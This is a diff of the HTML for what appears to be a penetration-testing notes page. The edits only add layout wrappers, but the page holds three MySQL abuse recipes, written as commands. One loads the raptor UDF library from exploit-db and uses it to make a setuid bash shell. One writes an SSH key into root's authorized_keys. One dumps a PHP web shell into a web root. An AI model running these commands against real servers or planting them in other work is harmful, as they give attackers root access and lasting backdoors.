@@ -202,6 +202,7 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-user-defined-function-udf">Abuse #1: User Defined Function (UDF)</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get the raptor_udf2.c</span>
 </span></span><span class="line"><span class="cl">wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Compile the source script</span>
@@ -227,7 +228,11 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">create <span class="k">function</span> do_system returns integer soname <span class="s1">&#39;raptor_udf2.so&#39;</span><span class="p">;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># RCE</span>
 </span></span><span class="line"><span class="cl"><span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell&#39;</span><span class="o">)</span><span class="p">;</span>
-</span></span></code></pre></div><h3 id="abuse-2-add-ssh-public-key-to-root">Abuse #2: Add ssh public key to root</h3>
+</span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="abuse-2-add-ssh-public-key-to-root">Abuse #2: Add ssh public key to root</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect to database as root</span>
 </span></span><span class="line"><span class="cl">mysql -u root -p&lt;PASSWORD&gt; mysql
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check privilege</span>
@@ -235,11 +240,16 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">show grants <span class="k">for</span> root@localhost<span class="p">;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># If mysql file write is not able to append or overwrite authorized_keys</span>
 </span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="s2">&#34;ssh-ed25519 AAAAC4NzaC1lZDI1NTE8AAAAINAhYR5O6zwRnV147lX8FuuMLs7o+K5/WfaoYVa8SmbR user@computer&#34;</span> into outfile <span class="s2">&#34;/root/.ssh/authorized_keys2&#34;</span><span class="p">;</span>
-</span></span></code></pre></div><h3 id="abuse-3-create-php-file-from-database-to-rce">Abuse #3: Create php File from Database to RCE</h3>
+</span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="abuse-3-create-php-file-from-database-to-rce">Abuse #3: Create php File from Database to RCE</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="nf">test</span><span class="p">(</span><span class="n">stuff</span><span class="w"> </span><span class="kt">text</span><span class="p">);</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">insert into <span class="nb">test</span> values<span class="o">(</span><span class="s1">&#39;&lt;?php system($_REQUEST[&#34;cmd&#34;]); ?&gt;&#39;</span><span class="o">)</span><span class="p">;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">select</span> * from <span class="nb">test</span> into dumpfile <span class="s1">&#39;C:\\xampp\\htdocs\\cmd.php&#39;</span><span class="p">;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
